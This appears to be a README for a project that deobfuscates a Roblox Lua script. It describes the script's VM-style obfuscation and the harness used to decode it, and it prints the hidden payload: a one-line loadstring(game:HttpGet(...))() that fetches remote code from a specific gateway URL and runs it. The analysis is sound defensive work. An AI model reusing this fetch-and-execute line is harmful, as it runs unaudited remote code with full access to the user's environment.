# deobfscr

Deobfuscation of a heavily obfuscated Lua/Luau (Roblox) script.

- `original.lua` — the untouched obfuscated input (~44KB, one line).
- `deobfuscated.lua` — the recovered real payload, with notes.
- `tools/` — the Lua VM harness used to dynamically decode the embedded
  payload (see below).

## Summary

`original.lua` is a custom control-flow-flattened Lua VM: the whole file is a
table of opcode-dispatcher closures, each a `while true do ... end` state
machine driven by a numeric register, plus one short embedded string that
holds the actual payload. The string is decoded at runtime through several
chained XOR / bit-shift / base91-ish stages.

Rather than manually devirtualizing the flattened dispatch (impractical by
hand at this size), the decoder was run under a real Lua VM
([fengari](https://fengari.io/), Lua 5.3-in-JS) with `bit32`/`getfenv`
polyfilled, since Luau targets Lua 5.1 semantics with a 5.2-style `bit32`
library that stock Lua 5.3 lacks. Two fixes were needed to get a clean run:

1. Luau's `0b101`-style binary literals aren't valid in a stock Lua 5.3
   lexer and had to be converted to decimal first (`tools/maketable.js`),
   being careful not to corrupt binary-looking substrings that occur inside
   unrelated hex literals.
2. A first pass at instrumenting `bit32`/`string` calls for tracing
   accidentally returned an extra value from library calls that only ever
   return one, which cascaded into corrupted decoded bytes; fixing the
   tracer to preserve exact call arity (`tools/trace.lua`) resolved it.

The decoded payload is 127 bytes; its only string constants are:

```
load, string, game, https://gate.sirius.menu/way?id=sid_ajbys3aqbgr1, Get
```

i.e. the entire ~44KB file exists to hide one line:

```lua
loadstring(game:HttpGet("https://gate.sirius.menu/way?id=sid_ajbys3aqbgr1"))()
```

`gate.sirius.menu/way?id=...` is a "Sirius Gateway" key-system checkpoint
page ("Get your key" / "Checkpoint progress" / "Sirius Developer Platform"),
the kind of leech-protection gate commonly used to monetize free Roblox
exploit scripts. `game:HttpGet()` sends Roblox `HttpService` request headers
rather than a browser's, so the real second-stage script it receives is not
the same thing a normal web fetch of that URL sees, and was not captured
here.

**Net effect:** whatever the key-system server decides to serve for this
`id` runs with full access to the executing script's environment. There is
no way to audit that code from the obfuscated file alone — treat it as
untrusted, and don't run it without knowing what's actually behind the gate.
